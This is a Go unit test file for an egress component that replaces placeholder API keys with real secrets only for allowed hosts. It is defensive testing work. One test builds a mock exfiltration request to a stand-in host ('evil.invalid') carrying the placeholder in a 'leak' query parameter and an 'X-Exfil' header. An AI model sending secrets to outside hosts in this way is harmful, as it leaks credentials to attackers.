// SPDX-FileCopyrightText: 2026 Latere AI
// SPDX-License-Identifier: Apache-2.0

package egress

import (
	"io"
	"net/http"
	"strings"
	"testing"
)

func newMap() *Map {
	return NewMap([]Entry{{
		Placeholder:  []byte("cph_key"),
		Secret:       []byte("sk-real"),
		AllowedHosts: []string{"api.provider.example"},
	}})
}

func TestSubstituteHTTPRequest_Header(t *testing.T) {
	req, _ := http.NewRequest("POST", "https://api.provider.example/v1/messages", nil)
	req.Header.Set("Authorization", "Bearer cph_key")
	req.Header.Set("X-Other", "plain")
	if !SubstituteHTTPRequest("api.provider.example", req, newMap()) {
		t.Fatal("expected substitution")
	}
	if got := req.Header.Get("Authorization"); got != "Bearer sk-real" {
		t.Fatalf("auth header: %q", got)
	}
	if req.Header.Get("X-Other") != "plain" {
		t.Fatal("unrelated header mutated")
	}
}

func TestSubstituteHTTPRequest_Query(t *testing.T) {
	req, _ := http.NewRequest("GET", "https://api.provider.example/data?api_key=cph_key&x=1", nil)
	if !SubstituteHTTPRequest("api.provider.example", req, newMap()) {
		t.Fatal("expected substitution")
	}
	if req.URL.RawQuery != "api_key=sk-real&x=1" {
		t.Fatalf("query: %q", req.URL.RawQuery)
	}
}

func TestSubstituteHTTPRequest_NonAllowedHostVerbatim(t *testing.T) {
	req, _ := http.NewRequest("GET", "https://evil.invalid/?leak=cph_key", nil)
	req.Header.Set("X-Exfil", "cph_key")
	if SubstituteHTTPRequest("evil.invalid", req, newMap()) {
		t.Fatal("must not substitute toward a non-allowed host")
	}
	if strings.Contains(req.URL.RawQuery, "sk-real") || req.Header.Get("X-Exfil") != "cph_key" {
		t.Fatal("secret leaked to non-allowed host")
	}
	// The placeholder is passed through verbatim, not stripped.
	if req.URL.RawQuery != "leak=cph_key" {
		t.Fatalf("placeholder not preserved verbatim: %q", req.URL.RawQuery)
	}
}

func TestSubstituteHTTPRequest_BodyUntouched(t *testing.T) {
	body := "cph_key in the body should not be read or changed"
	req, _ := http.NewRequest("POST", "https://api.provider.example/v1/messages", io.NopCloser(strings.NewReader(body)))
	req.Header.Set("Authorization", "Bearer cph_key")
	SubstituteHTTPRequest("api.provider.example", req, newMap())
	// Body is still fully readable and unchanged (never consumed by the engine).
	got, _ := io.ReadAll(req.Body)
	if string(got) != body {
		t.Fatalf("body changed or partially consumed: %q", got)
	}
}

func TestSubstituteHTTPRequest_EmptyAndNil(t *testing.T) {
	req, _ := http.NewRequest("GET", "https://api.provider.example/?k=cph_key", nil)
	if SubstituteHTTPRequest("api.provider.example", req, &Map{}) {
		t.Fatal("empty map must not fire")
	}
	if SubstituteHTTPRequest("api.provider.example", nil, newMap()) {
		t.Fatal("nil request must not fire")
	}
}
